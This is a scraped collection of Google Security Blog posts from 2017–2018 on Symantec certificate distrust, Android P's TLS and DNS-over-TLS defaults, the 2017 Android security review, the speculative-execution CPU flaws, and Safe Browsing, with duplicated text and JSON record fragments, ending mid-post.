You are strongly encouraged to replace your certificate as soon as possible if your site is currently showing an error in Chrome Canary.            Chrome 70                    Starting in Chrome 70, all remaining Symantec SSL/TLS certificates will stop working, resulting in a certificate error like the one shown above. To check if your certificate will be affected, visit your site in Chrome today and open up DevTools. You&#8217;ll see a message in the console telling you if you need to replace your certificate.                           The DevTools message you will see if you need to replace your certificate before Chrome 70.      If you see this message in DevTools, you&#8217;ll want to replace your certificate as soon as possible. If the certificates are not replaced, users will begin seeing certificate errors on your site as early as  July 20, 2018 . The first Chrome 70 Beta release will be around September 13, 2018.                Expected Chrome Release Timeline                    The table below shows the First Canary, First Beta and Stable Release for Chrome 66 and 70. The first impact from a given release will coincide with the First Canary, reaching a steadily widening audience as the release hits Beta and then ultimately Stable. Site operators are strongly encouraged to make the necessary changes to their sites before the First Canary release for Chrome 66 and 70, and no later than the corresponding Beta release dates.                        Release        First Canary        First Beta        Stable Release           Chrome 66        January 20, 2018        ~ March 15, 2018        ~ April 17, 2018           Chrome 70        ~ July 20, 2018        ~ September 13, 2018        ~ October 16, 2018                    For information about the release timeline for a particular version of Chrome, you can also refer to the&nbsp; Chromium Development Calendar &nbsp;which will be updated should release schedules change.         In order to address the needs of certain enterprise users, Chrome will also implement an Enterprise Policy that allows disabling the Legacy Symantec PKI distrust starting with Chrome 66. As of January 1, 2019, this policy will no longer be available and the Legacy Symantec PKI will be distrusted for all users.&nbsp;See this  Enterprise Help Center article  for more information.                         Special Mention: Chrome 65                  As noted in the  previous announcement , SSL/TLS certificates from the Legacy Symantec PKI issued after December 1, 2017 are no longer trusted. This should not affect most site operators, as it requires entering in to special agreement with DigiCert to obtain such certificates. Accessing a site serving such a certificate will fail and the request will be blocked as of Chrome 65. To avoid such errors, ensure that such certificates are only served to legacy devices and not to browsers such as Chrome.                                       Posted by Devon O’Brien, Ryan Sleevi, Emily Stark, Chrome security team  Update October 17, 2018: Chrome 70 has now been released to the Stable Channel, and users will start to see full screen interstitials on sites which still use certificates issues by the Legacy Symantec PKI. Initially this change will reach a small percentage of users, and then slowly scale up to 100% over the next several weeks.  Site Operators receiving problem reports from users are strongly encouraged to take corrective action by replacing their website certificates as soon as possible. Instructions on how to determine whether your site is affected as well as what corrective action is needed can be found below.   We previously announced plans to deprecate Chrome’s trust in the Symantec certificate authority (including Symantec-owned brands like Thawte, VeriSign, Equifax, GeoTrust, and RapidSSL). This post outlines how site operators can determine if they’re affected by this deprecation, and if so, what needs to be done and by when. Failure to replace these certificates will result in site breakage in upcoming versions of major browsers, including Chrome.  Chrome 66  If your site is using a SSL/TLS certificate from Symantec that was issued before June 1, 2016, it will stop functioning in Chrome 66, which could already be impacting your users. If you are uncertain about whether your site is using such a certificate, you can preview these changes in Chrome Canary to see if your site is affected. If connecting to your site displays a certificate error or a warning in DevTools as shown below, you’ll need to replace your certificate. You can get a new certificate from any trusted CA, including Digicert, which recently acquired Symantec’s CA business.   An example of a certificate error that Chrome 66 users might see if you are using a Legacy Symantec SSL/TLS certificate that was issued before June 1, 2016.              The DevTools message you will see if you need to replace your certificate before Chrome 66.    Chrome 66 has already been released to the Canary and Dev channels, meaning affected sites are already impacting users of these Chrome channels. If affected sites do not replace their certificates by March 15, 2018, Chrome Beta users will begin experiencing the failures as well. You are strongly encouraged to replace your certificate as soon as possible if your site is currently showing an error in Chrome Canary.    Chrome 70        Starting in Chrome 70, all remaining Symantec SSL/TLS certificates will stop working, resulting in a certificate error like the one shown above. To check if your certificate will be affected, visit your site in Chrome today and open up DevTools. You’ll see a message in the console telling you if you need to replace your certificate.         The DevTools message you will see if you need to replace your certificate before Chrome 70.  If you see this message in DevTools, you’ll want to replace your certificate as soon as possible. If the certificates are not replaced, users will begin seeing certificate errors on your site as early as July 20, 2018. The first Chrome 70 Beta release will be around September 13, 2018.      Expected Chrome Release Timeline        The table below shows the First Canary, First Beta and Stable Release for Chrome 66 and 70. The first impact from a given release will coincide with the First Canary, reaching a steadily widening audience as the release hits Beta and then ultimately Stable. Site operators are strongly encouraged to make the necessary changes to their sites before the First Canary release for Chrome 66 and 70, and no later than the corresponding Beta release dates.     Release  First Canary  First Beta  Stable Release   Chrome 66  January 20, 2018  ~ March 15, 2018  ~ April 17, 2018   Chrome 70  ~ July 20, 2018  ~ September 13, 2018  ~ October 16, 2018        For information about the release timeline for a particular version of Chrome, you can also refer to the Chromium Development Calendar which will be updated should release schedules change.    In order to address the needs of certain enterprise users, Chrome will also implement an Enterprise Policy that allows disabling the Legacy Symantec PKI distrust starting with Chrome 66. As of January 1, 2019, this policy will no longer be available and the Legacy Symantec PKI will be distrusted for all users. See this Enterprise Help Center article for more information.          Special Mention: Chrome 65        As noted in the previous announcement, SSL/TLS certificates from the Legacy Symantec PKI issued after December 1, 2017 are no longer trusted. This should not affect most site operators, as it requires entering in to special agreement with DigiCert to obtain such certificates. Accessing a site serving such a certificate will fail and the request will be blocked as of Chrome 65. To avoid such errors, ensure that such certificates are only served to legacy devices and not to browsers such as Chrome.      ", "date": "March 7, 2018"},
{"website": "Google-Security", "title": "\nProtecting users with TLS by default in Android P\n", "author": ["Posted by Chad Brubaker, Senior Software Engineer Android Security"], "link": "https://security.googleblog.com/2018/04/protecting-users-with-tls-by-default-in.html", "abstract": "                             Posted by Chad Brubaker, Senior Software Engineer Android Security    [Cross-posted from the  Android Developers Blog ]     Android is committed to keeping users, their devices, and their data safe. One of the ways that we keep data safe is by protecting all data that enters or leaves an Android device with Transport Layer Security (TLS) in transit. As we  announced  in our Android P developer preview, we're further improving these protections by preventing apps that target Android P from allowing unencrypted connections by default.    This follows a variety of changes we've made over the years to better protect Android users. To prevent accidental unencrypted connections, we introduced the&nbsp; android:usesCleartextTraffic &nbsp;manifest attribute in Android Marshmallow. In Android Nougat, we extended that attribute by creating the  Network Security Config  feature, which allows apps to indicate that they do not intend to send network traffic without encryption. In Android Nougat and Oreo, we still allowed cleartext connections.     How do I update my app?       If your app uses TLS for all connections then you have nothing to do. If not, update your app to use TLS to encrypt all connections. If you still need to make cleartext connections, keep reading for some best practices.     Why should I use TLS?       Android considers all networks potentially hostile and so encrypting traffic should be used at all times, for all connections. Mobile devices are especially at risk because they regularly connect to many different networks, such as the Wi-Fi at a coffee shop.    All traffic should be encrypted, regardless of content, as any unencrypted connections can be used to inject content, increase attack surface for potentially vulnerable client code, or track the user. For more information, see our past  blog post  and  Developer Summit talk .     Isn't TLS slow?        No, it's not.      How do I use TLS in my app?       Once your server supports TLS, simply change the URLs in your app and server responses from http:// to https://. Your HTTP stack handles the TLS handshake without any more work.    If you are making sockets yourself, use an  SSLSocketFactory  instead of a  SocketFactory . Take extra care to use the socket correctly as  SSLSocket  doesn't perform hostname verification. Your app needs to do its own hostname verification, preferably by calling&nbsp; getDefaultHostnameVerifier() &nbsp;with the expected hostname. Further, beware that&nbsp; HostnameVerifier.verify() &nbsp;doesn't throw an exception on error but instead returns a boolean result that you must explicitly check.     I need to use cleartext traffic to       While you should use TLS for all connections, it's possibly that you need to use cleartext traffic for legacy reasons, such as connecting to some servers. To do this, change your app's network security config to allow those connections.    We've included a couple example configurations. See the  network security config  documentation for a bit more help.     Allow cleartext connections to a specific domain       If you need to allow connections to a specific domain or set of domains, you can use the following config as a guide:    &lt;network-security-config&gt;         &lt;domain-config     cleartextTrafficPermitted  =  \"true\"  &gt;             &lt;domain     includeSubdomains  =  \"true\"  &gt;  insecure.example.com  &lt;/domain&gt;             &lt;domain     includeSubdomains  =  \"true\"  &gt;  insecure.cdn.example.com  &lt;/domain&gt;         &lt;/domain-config&gt;     &lt;/network-security-config&gt;    Allow connections to arbitrary insecure domains       If your app supports opening arbitrary content from URLs over insecure connections, you should disable cleartext connections to your own services while supporting cleartext connections to arbitrary hosts. Keep in mind that you should be cautious about the data received over insecure connections as it could have been tampered with in transit.      &lt;network-security-config&gt;         &lt;domain-config     cleartextTrafficPermitted  =  \"false\"  &gt;             &lt;domain     includeSubdomains  =  \"true\"  &gt;  example.com  &lt;/domain&gt;             &lt;domain     includeSubdomains  =  \"true\"  &gt;  cdn.example2.com  &lt;/domain&gt;         &lt;/domain-config&gt;         &lt;base-config     cleartextTrafficPermitted  =  \"true\"     /&gt;     &lt;/network-security-config&gt;        How do I update my library?     If your library directly creates secure/insecure connections, make sure that it honors the app's cleartext settings by checking  isCleartextTrafficPermitted  before opening any cleartext connection.                                   Posted by Chad Brubaker, Senior Software Engineer Android Security [Cross-posted from the Android Developers Blog]  Android is committed to keeping users, their devices, and their data safe. One of the ways that we keep data safe is by protecting all data that enters or leaves an Android device with Transport Layer Security (TLS) in transit. As we announced in our Android P developer preview, we're further improving these protections by preventing apps that target Android P from allowing unencrypted connections by default.  This follows a variety of changes we've made over the years to better protect Android users. To prevent accidental unencrypted connections, we introduced the android:usesCleartextTraffic manifest attribute in Android Marshmallow. In Android Nougat, we extended that attribute by creating the Network Security Config feature, which allows apps to indicate that they do not intend to send network traffic without encryption. In Android Nougat and Oreo, we still allowed cleartext connections.  How do I update my app?  If your app uses TLS for all connections then you have nothing to do. If not, update your app to use TLS to encrypt all connections. If you still need to make cleartext connections, keep reading for some best practices.  Why should I use TLS?  Android considers all networks potentially hostile and so encrypting traffic should be used at all times, for all connections. Mobile devices are especially at risk because they regularly connect to many different networks, such as the Wi-Fi at a coffee shop.  All traffic should be encrypted, regardless of content, as any unencrypted connections can be used to inject content, increase attack surface for potentially vulnerable client code, or track the user. For more information, see our past blog post and Developer Summit talk.  Isn't TLS slow?  No, it's not.  How do I use TLS in my app?  Once your server supports TLS, simply change the URLs in your app and server responses from http:// to https://. Your HTTP stack handles the TLS handshake without any more work.  If you are making sockets yourself, use an SSLSocketFactory instead of a SocketFactory. Take extra care to use the socket correctly as SSLSocket doesn't perform hostname verification. Your app needs to do its own hostname verification, preferably by calling getDefaultHostnameVerifier() with the expected hostname. Further, beware that HostnameVerifier.verify() doesn't throw an exception on error but instead returns a boolean result that you must explicitly check.  I need to use cleartext traffic to  While you should use TLS for all connections, it's possibly that you need to use cleartext traffic for legacy reasons, such as connecting to some servers. To do this, change your app's network security config to allow those connections.  We've included a couple example configurations. See the network security config documentation for a bit more help.  Allow cleartext connections to a specific domain  If you need to allow connections to a specific domain or set of domains, you can use the following config as a guide:                  insecure.example.com           insecure.cdn.example.com          Allow connections to arbitrary insecure domains  If your app supports opening arbitrary content from URLs over insecure connections, you should disable cleartext connections to your own services while supporting cleartext connections to arbitrary hosts. Keep in mind that you should be cautious about the data received over insecure connections as it could have been tampered with in transit.                   example.com           cdn.example2.com                 How do I update my library?  If your library directly creates secure/insecure connections, make sure that it honors the app's cleartext settings by checking isCleartextTrafficPermitted before opening any cleartext connection.     ", "date": "April 12, 2018"},
{"website": "Google-Security", "title": "\nAndroid Security 2017 Year in Review\n", "author": ["Posted by Dave Kleidermacher, Vice President of Security for Android, Play, ChromeOS"], "link": "https://security.googleblog.com/2018/03/android-security-2017-year-in-review.html", "abstract": "                             Posted by Dave Kleidermacher, Vice President of Security for Android, Play, ChromeOS     Our team&#8217;s goal is simple: secure more than two billion Android devices. It&#8217;s our entire focus, and we&#8217;re constantly working to improve our protections to keep users safe.  Today, we&#8217;re releasing our fourth annual Android Security Year in Review. We compile these reports to help educate the public about the many different layers of Android security, and also to hold ourselves accountable so that anyone can track our security work over time.  We saw really positive momentum last year and this post includes some, but not nearly all, of the major moments from 2017. To dive into all the details, you can read the full report at:  g.co/AndroidSecurityReport2017         Google Play Protect      In May, we  announced  Google Play Protect, a new home for the suite of Android security services on nearly two billion devices. While many of Play Protect&#8217;s features had been securing Android devices for years, we wanted to make these more visible to help assure people that our security protections are constantly working to keep them safe.    Play Protect&#8217;s core objective is to shield users from Potentially Harmful Apps, or PHAs. Every day, it automatically reviews more than 50 billion apps, other potential sources of PHAs, and devices themselves and takes action when it finds any.    Play Protect uses a variety of different tactics to keep users and their data safe, but the impact of machine learning is already quite significant: 60.3% of all Potentially Harmful Apps were detected via machine learning, and we expect this to increase in the future.            Protecting users' devices     Play Protect automatically checks Android devices for PHAs at least once every day, and users can conduct an additional review at any time for some extra peace of mind. These automatic reviews enabled us to remove nearly 39 million PHAs last year.         We also update Play Protect to respond to trends that we detect across the ecosystem. For instance, we recognized that nearly 35% of new PHA installations were occurring when a device was offline or had lost network connectivity. As a result, in October 2017, we enabled offline scanning in Play Protect, and have since prevented 10 million more PHA installs.                   Preventing PHA downloads     Devices that downloaded apps exclusively from Google Play were nine times less likely to get a PHA than devices that downloaded apps from other sources. And these security protections continue to improve, partially because of Play Protect&#8217;s increased visibility into newly submitted apps to Play. It reviewed 65% more Play apps compared to 2016.         Play Protect also doesn&#8217;t just secure Google Play&#8212;it helps protect the broader Android ecosystem as well. Thanks in large part to Play Protect, the installation rates of PHAs from outside of Google Play dropped by more than 60%.                                 Security updates                While Google Play Protect is a great shield against harmful PHAs, we also partner with device manufacturers to make sure that the version of Android running on users' devices is up-to-date and secure.         Throughout the year, we worked to improve the process for releasing security updates, and 30% more devices received security patches than in 2016. Furthermore, no critical security vulnerabilities affecting the Android platform were publicly disclosed without an update or mitigation available for Android devices. This was possible due to the  Android Security Rewards Program , enhanced collaboration with the  security researcher community , coordination with industry partners, and built-in security features of the Android platform.                    New security features in Android Oreo                We introduced a slew of new security features in Android Oreo:  making it safer to get apps , dropping  insecure network protocols , providing more  user control over identifiers ,  hardening the kernel , and more.         We highlighted many of these over the course of the year, but some may have flown under the radar. For example, we updated the overlay API so that apps can no longer block the entire screen and prevent you from dismissing them, a common tactic employed by ransomware.                    Openness makes Android security stronger                We&#8217;ve long said it, but it remains truer than ever: Android&#8217;s openness helps strengthen our security protections. For years, the Android ecosystem has benefitted from researchers&#8217; findings, and 2017 was no different.            Security reward programs     We continued to see great momentum with our Android Security Rewards program: we paid researchers $1.28 million dollars, pushing our total rewards past $2 million dollars since the program began. We also  increased our top-line payouts  for exploits that compromise TrustZone or Verified Boot from $50,000 to $200,000, and remote kernel exploits from $30,000 to $150,000.         In parallel, we introduced  Google Play Security Rewards Program  and offered a bonus bounty to developers that discover and disclose select critical vulnerabilities in apps hosted on Play to their developers.            External security competitions     Our teams also participated in external vulnerability discovery and disclosure competitions, such as  Mobile Pwn2Own . At the 2017 Mobile Pwn2Own competition, no exploits successfully compromised the Google Pixel. And of the exploits demonstrated against devices running Android, none could be reproduced on a device running unmodified Android source code from the  Android Open Source Project  (AOSP).                   We&#8217;re pleased to see the positive momentum behind Android security, and we&#8217;ll continue our work to improve our protections this year, and beyond. We will never stop our work to ensure the security of Android users.                                     Posted by Dave Kleidermacher, Vice President of Security for Android, Play, ChromeOS  Our team’s goal is simple: secure more than two billion Android devices. It’s our entire focus, and we’re constantly working to improve our protections to keep users safe. Today, we’re releasing our fourth annual Android Security Year in Review. We compile these reports to help educate the public about the many different layers of Android security, and also to hold ourselves accountable so that anyone can track our security work over time. We saw really positive momentum last year and this post includes some, but not nearly all, of the major moments from 2017. To dive into all the details, you can read the full report at: g.co/AndroidSecurityReport2017  Google Play Protect  In May, we announced Google Play Protect, a new home for the suite of Android security services on nearly two billion devices. While many of Play Protect’s features had been securing Android devices for years, we wanted to make these more visible to help assure people that our security protections are constantly working to keep them safe.  Play Protect’s core objective is to shield users from Potentially Harmful Apps, or PHAs. Every day, it automatically reviews more than 50 billion apps, other potential sources of PHAs, and devices themselves and takes action when it finds any.  Play Protect uses a variety of different tactics to keep users and their data safe, but the impact of machine learning is already quite significant: 60.3% of all Potentially Harmful Apps were detected via machine learning, and we expect this to increase in the future.    Protecting users' devices  Play Protect automatically checks Android devices for PHAs at least once every day, and users can conduct an additional review at any time for some extra peace of mind. These automatic reviews enabled us to remove nearly 39 million PHAs last year.    We also update Play Protect to respond to trends that we detect across the ecosystem. For instance, we recognized that nearly 35% of new PHA installations were occurring when a device was offline or had lost network connectivity. As a result, in October 2017, we enabled offline scanning in Play Protect, and have since prevented 10 million more PHA installs.      Preventing PHA downloads  Devices that downloaded apps exclusively from Google Play were nine times less likely to get a PHA than devices that downloaded apps from other sources. And these security protections continue to improve, partially because of Play Protect’s increased visibility into newly submitted apps to Play. It reviewed 65% more Play apps compared to 2016.    Play Protect also doesn’t just secure Google Play—it helps protect the broader Android ecosystem as well. Thanks in large part to Play Protect, the installation rates of PHAs from outside of Google Play dropped by more than 60%.        Security updates      While Google Play Protect is a great shield against harmful PHAs, we also partner with device manufacturers to make sure that the version of Android running on users' devices is up-to-date and secure.    Throughout the year, we worked to improve the process for releasing security updates, and 30% more devices received security patches than in 2016. Furthermore, no critical security vulnerabilities affecting the Android platform were publicly disclosed without an update or mitigation available for Android devices. This was possible due to the Android Security Rewards Program, enhanced collaboration with the security researcher community, coordination with industry partners, and built-in security features of the Android platform.      New security features in Android Oreo      We introduced a slew of new security features in Android Oreo: making it safer to get apps, dropping insecure network protocols, providing more user control over identifiers, hardening the kernel, and more.    We highlighted many of these over the course of the year, but some may have flown under the radar. For example, we updated the overlay API so that apps can no longer block the entire screen and prevent you from dismissing them, a common tactic employed by ransomware.      Openness makes Android security stronger      We’ve long said it, but it remains truer than ever: Android’s openness helps strengthen our security protections. For years, the Android ecosystem has benefitted from researchers’ findings, and 2017 was no different.    Security reward programs  We continued to see great momentum with our Android Security Rewards program: we paid researchers $1.28 million dollars, pushing our total rewards past $2 million dollars since the program began. We also increased our top-line payouts for exploits that compromise TrustZone or Verified Boot from $50,000 to $200,000, and remote kernel exploits from $30,000 to $150,000.    In parallel, we introduced Google Play Security Rewards Program and offered a bonus bounty to developers that discover and disclose select critical vulnerabilities in apps hosted on Play to their developers.    External security competitions  Our teams also participated in external vulnerability discovery and disclosure competitions, such as Mobile Pwn2Own. At the 2017 Mobile Pwn2Own competition, no exploits successfully compromised the Google Pixel. And of the exploits demonstrated against devices running Android, none could be reproduced on a device running unmodified Android source code from the Android Open Source Project (AOSP).        We’re pleased to see the positive momentum behind Android security, and we’ll continue our work to improve our protections this year, and beyond. We will never stop our work to ensure the security of Android users.     ", "date": "March 15, 2018"},
{"website": "Google-Security", "title": "\nDNS over TLS support in Android P Developer Preview\n", "author": ["Posted by Erik Kline, Android software engineer, and Ben Schwartz, Jigsaw software engineer"], "link": "https://security.googleblog.com/2018/04/dns-over-tls-support-in-android-p.html", "abstract": "                             Posted by Erik Kline, Android software engineer, and Ben Schwartz, Jigsaw software engineer      [Cross-posted from the  Android Developers Blog ]     The first step of almost every connection on the internet is a  DNS  query. A client, such as a smartphone, typically uses a DNS server provided by the Wi-Fi or cellular network. The client asks this DNS server to convert a domain name, like www.google.com, into an IP address, like 2607:f8b0:4006:80e::2004. Once the client has the IP address, it can connect to its intended destination.    When the DNS protocol was designed in the 1980s, the internet was a much smaller, simpler place. For the past few years, the Internet Engineering Task Force ( IETF ) has worked to define a new DNS protocol that provides users with the latest protections for security and privacy. The protocol is called \"DNS over TLS\" (standardized as  RFC 7858 ).    Like HTTPS, DNS over TLS uses the TLS protocol to establish a secure channel to the server. Once the secure channel is established, DNS queries and responses can't be read or modified by anyone else who might be monitoring the connection. (The secure channel only applies to DNS, so it can't protect users from other kinds of security and privacy violations.)     DNS over TLS in P       The Android P Developer Preview includes built-in support for DNS over TLS. We added a Private DNS mode to the Network &amp; internet settings.         By default, devices automatically upgrade to DNS over TLS if a network's DNS server supports it. But users who don't want to use DNS over TLS can turn it off.    Users can enter a hostname if they want to use a private DNS provider. Android then sends all DNS queries over a secure channel to this server or marks the network as \"No internet access\" if it can't reach the server. (For testing purposes, see this  community-maintained list  of compatible servers.)    DNS over TLS mode automatically secures the DNS queries from all apps on the system. However, apps that perform their own DNS queries, instead of using the system's APIs, must ensure that they do not send insecure DNS queries when the system has a secure connection. Apps can get this information using a new API:&nbsp;  LinkProperties.isPrivateDnsActive()        With the Android P Developer Preview, we're proud to present built-in support for DNS over TLS. In the future, we hope that all operating systems will include secure transports for DNS, to provide better protection and privacy for all users on every new connection.                                   Posted by Erik Kline, Android software engineer, and Ben Schwartz, Jigsaw software engineer  [Cross-posted from the Android Developers Blog]  The first step of almost every connection on the internet is a DNS query. A client, such as a smartphone, typically uses a DNS server provided by the Wi-Fi or cellular network. The client asks this DNS server to convert a domain name, like www.google.com, into an IP address, like 2607:f8b0:4006:80e::2004. Once the client has the IP address, it can connect to its intended destination.  When the DNS protocol was designed in the 1980s, the internet was a much smaller, simpler place. For the past few years, the Internet Engineering Task Force (IETF) has worked to define a new DNS protocol that provides users with the latest protections for security and privacy. The protocol is called \"DNS over TLS\" (standardized as RFC 7858).  Like HTTPS, DNS over TLS uses the TLS protocol to establish a secure channel to the server. Once the secure channel is established, DNS queries and responses can't be read or modified by anyone else who might be monitoring the connection. (The secure channel only applies to DNS, so it can't protect users from other kinds of security and privacy violations.)  DNS over TLS in P  The Android P Developer Preview includes built-in support for DNS over TLS. We added a Private DNS mode to the Network & internet settings.   By default, devices automatically upgrade to DNS over TLS if a network's DNS server supports it. But users who don't want to use DNS over TLS can turn it off.  Users can enter a hostname if they want to use a private DNS provider. Android then sends all DNS queries over a secure channel to this server or marks the network as \"No internet access\" if it can't reach the server. (For testing purposes, see this community-maintained list of compatible servers.)  DNS over TLS mode automatically secures the DNS queries from all apps on the system. However, apps that perform their own DNS queries, instead of using the system's APIs, must ensure that they do not send insecure DNS queries when the system has a secure connection. Apps can get this information using a new API: LinkProperties.isPrivateDnsActive()  With the Android P Developer Preview, we're proud to present built-in support for DNS over TLS. In the future, we hope that all operating systems will include secure transports for DNS, to provide better protection and privacy for all users on every new connection.     ", "date": "April 17, 2018"},
{"website": "Google-Security", "title": "\nToday's CPU vulnerability: what you need to know\n", "author": ["Posted by Matt Linton, Senior Security Engineer and Pat Parseghian, Technical Program Manager"], "link": "https://security.googleblog.com/2018/01/todays-cpu-vulnerability-what-you-need.html", "abstract": "                             Posted by Matt Linton, Senior Security Engineer and Pat Parseghian, Technical Program Manager      [Google Cloud, G Suite, and Chrome customers can visit the  Google Cloud blog  for details about those products]    [For more technical details about this issue, please read  Project Zero's blog post ]     Last year,  Google&#8217;s Project Zero  team discovered serious security flaws caused by &#8220; speculative execution ,&#8221; a technique used by most modern processors (CPUs) to optimize performance.    The Project Zero researcher, Jann Horn, demonstrated that malicious actors could take advantage of speculative execution to read system memory that should have been inaccessible. For example, an unauthorized party may read sensitive information in the system&#8217;s memory such as passwords, encryption keys, or sensitive information open in applications. Testing also showed that an attack running on one virtual machine was able to access the physical memory of the host machine, and through that, gain read-access to the memory of a different virtual machine on the same host.    These vulnerabilities affect many CPUs, including those from AMD, ARM, and Intel, as well as the devices and operating systems running on them.    As soon as we learned of this new class of attack, our security and product development teams mobilized to defend Google&#8217;s systems and our users&#8217; data. We have updated our systems and affected products to protect against this new type of attack. We also collaborated with hardware and software manufacturers across the industry to help protect their users and the broader web. These efforts have included collaborative analysis and the development of novel mitigations.    We are posting before an originally coordinated disclosure date of January 9, 2018 because of existing public reports and growing speculation in the press and security research community about the issue, which raises the risk of exploitation. The full Project Zero report is forthcoming (update: this has been published; see above).     Mitigation status for Google products     A list of affected Google products and their current status of mitigation against this attack appears  here . As this is a new class of attack, our patch status refers to our mitigation for currently known vectors for exploiting the flaw. The issue has been mitigated in many products (or wasn&#8217;t a vulnerability in the first place). In some instances, users and customers may need to take additional steps to ensure they&#8217;re using a protected version of a product. This list and a product&#8217;s status may change as new developments warrant. In the case of new developments, we will post updates to this blog.       All Google products not explicitly listed below require no user or customer action.   Android     Devices with the  latest security update  are protected. Furthermore, we are unaware of any successful reproduction of this vulnerability that would allow unauthorized information disclosure on ARM-based Android devices.   Supported Nexus and Pixel devices with the latest security update are protected.   Further information is available  here .     Google Apps / G Suite (Gmail, Calendar, Drive, Sites, etc.):     No additional user or customer action needed.     Google Chrome     Some user or customer action needed. More information  here .     Google Chrome OS (e.g., Chromebooks):     Some additional user or customer action needed. More information  here .     Google Cloud Platform     Google App Engine: No additional customer action needed.   Google Compute Engine: Some additional customer action needed. More information  here .   Google Kubernetes Engine: Some additional customer action needed. More information  here .   Google Cloud Dataflow: Some additional customer action needed. More information  here .   Google Cloud Dataproc: Some additional customer action needed. More information  here .&nbsp;   All other Google Cloud products and services: No additional action needed.     Google Home / Chromecast:     No additional user action needed.     Google Wifi/OnHub:     No additional user action needed.         Multiple methods of attack          To take advantage of this vulnerability, an attacker first must be able to run malicious code on the targeted system.         The Project Zero researchers discovered three methods (variants) of attack, which are effective under different conditions. All three attack variants can allow a process with normal user privileges to perform unauthorized reads of memory data, which may contain sensitive information such as passwords, cryptographic key material, etc.         In order to improve performance, many CPUs may choose to speculatively execute instructions based on assumptions that are considered likely to be true. During speculative execution, the processor is verifying these assumptions; if they are valid, then the execution continues. If they are invalid, then the execution is unwound, and the correct execution path can be started based on the actual conditions. It is possible for this speculative execution to have side effects which are not restored when the CPU state is unwound, and can lead to information disclosure.         There is no single fix for all three attack variants; each requires protection independently. Many vendors have patches available for one or more of these attacks.         We will continue our work to mitigate these vulnerabilities and will update both our product support page and this blog post as we release further fixes. More broadly, we appreciate the support and involvement of all the partners and Google engineers who worked tirelessly over the last few months to make our users and customers safe.     Blog post update log        Added link to Project Zero blog   Added link to Google Cloud blog                                         Posted by Matt Linton, Senior Security Engineer and Pat Parseghian, Technical Program Manager  [Google Cloud, G Suite, and Chrome customers can visit the Google Cloud blog for details about those products] [For more technical details about this issue, please read Project Zero's blog post]  Last year, Google’s Project Zero team discovered serious security flaws caused by “speculative execution,” a technique used by most modern processors (CPUs) to optimize performance.  The Project Zero researcher, Jann Horn, demonstrated that malicious actors could take advantage of speculative execution to read system memory that should have been inaccessible. For example, an unauthorized party may read sensitive information in the system’s memory such as passwords, encryption keys, or sensitive information open in applications. Testing also showed that an attack running on one virtual machine was able to access the physical memory of the host machine, and through that, gain read-access to the memory of a different virtual machine on the same host.  These vulnerabilities affect many CPUs, including those from AMD, ARM, and Intel, as well as the devices and operating systems running on them.  As soon as we learned of this new class of attack, our security and product development teams mobilized to defend Google’s systems and our users’ data. We have updated our systems and affected products to protect against this new type of attack. We also collaborated with hardware and software manufacturers across the industry to help protect their users and the broader web. These efforts have included collaborative analysis and the development of novel mitigations.  We are posting before an originally coordinated disclosure date of January 9, 2018 because of existing public reports and growing speculation in the press and security research community about the issue, which raises the risk of exploitation. The full Project Zero report is forthcoming (update: this has been published; see above).  Mitigation status for Google products  A list of affected Google products and their current status of mitigation against this attack appears here. As this is a new class of attack, our patch status refers to our mitigation for currently known vectors for exploiting the flaw. The issue has been mitigated in many products (or wasn’t a vulnerability in the first place). In some instances, users and customers may need to take additional steps to ensure they’re using a protected version of a product. This list and a product’s status may change as new developments warrant. In the case of new developments, we will post updates to this blog.   All Google products not explicitly listed below require no user or customer action. Android  Devices with the latest security update are protected. Furthermore, we are unaware of any successful reproduction of this vulnerability that would allow unauthorized information disclosure on ARM-based Android devices. Supported Nexus and Pixel devices with the latest security update are protected. Further information is available here.  Google Apps / G Suite (Gmail, Calendar, Drive, Sites, etc.):  No additional user or customer action needed.  Google Chrome  Some user or customer action needed. More information here.  Google Chrome OS (e.g., Chromebooks):  Some additional user or customer action needed. More information here.  Google Cloud Platform  Google App Engine: No additional customer action needed. Google Compute Engine: Some additional customer action needed. More information here. Google Kubernetes Engine: Some additional customer action needed. More information here. Google Cloud Dataflow: Some additional customer action needed. More information here. Google Cloud Dataproc: Some additional customer action needed. More information here.  All other Google Cloud products and services: No additional action needed.  Google Home / Chromecast:  No additional user action needed.  Google Wifi/OnHub:  No additional user action needed.    Multiple methods of attack    To take advantage of this vulnerability, an attacker first must be able to run malicious code on the targeted system.    The Project Zero researchers discovered three methods (variants) of attack, which are effective under different conditions. All three attack variants can allow a process with normal user privileges to perform unauthorized reads of memory data, which may contain sensitive information such as passwords, cryptographic key material, etc.    In order to improve performance, many CPUs may choose to speculatively execute instructions based on assumptions that are considered likely to be true. During speculative execution, the processor is verifying these assumptions; if they are valid, then the execution continues. If they are invalid, then the execution is unwound, and the correct execution path can be started based on the actual conditions. It is possible for this speculative execution to have side effects which are not restored when the CPU state is unwound, and can lead to information disclosure.    There is no single fix for all three attack variants; each requires protection independently. Many vendors have patches available for one or more of these attacks.    We will continue our work to mitigate these vulnerabilities and will update both our product support page and this blog post as we release further fixes. More broadly, we appreciate the support and involvement of all the partners and Google engineers who worked tirelessly over the last few months to make our users and customers safe.  Blog post update log   Added link to Project Zero blog Added link to Google Cloud blog       ", "date": "January 3, 2018"},
{"website": "Google-Security", "title": "\nSafe Browsing: Protecting more than 3 billion devices worldwide, automatically\n", "author": ["Posted by Stephan Somogyi, Safe Browsing Emeritus and Allison Miller, Security & Privacy"], "link": "https://security.googleblog.com/2017/09/safe-browsing-protecting-more-than-3_11.html", "abstract": "                             Posted by Stephan Somogyi, Safe Browsing Emeritus and Allison Miller, Security &amp; Privacy      [Cross-posted from  The Keyword ]     In 2007, we  launched  Safe Browsing, one of Google&#8217;s earliest anti-malware efforts. To keep our users safe, we&#8217;d show them a warning before they visited a site that might&#8217;ve harmed their computers.         Computing has evolved a bit in the last decade, though. Smartphones created a more mobile internet, and now AI is increasingly changing how the world interacts with it. Safe Browsing also had to evolve to effectively protect users.    And it has: In May 2016, we announced that  Safe Browsing  was protecting more than 2 billion devices from badness on the internet. Today we&#8217;re announcing that Safe Browsing has crossed the threshold to 3 billion devices. We&#8217;re sharing a bit more about how we got here, and where we&#8217;re going.     What is Safe Browsing?       You may not know Safe Browsing by name, since most of the time we&#8217;re invisibly protecting you, without getting in the way. But you may have seen a warning like this at some point:         This notification is one of the visible parts of Safe Browsing, a collection of Google technologies that hunt badness&#8212;typically websites that deceive users&#8212;on the internet. We identify sites that might try to phish you, or sites that install malware or other undesirable software. The systems that make up Safe Browsing work together to identify, analyze and continuously keep Safe Browsing&#8217;s knowledge of the harmful parts of the internet 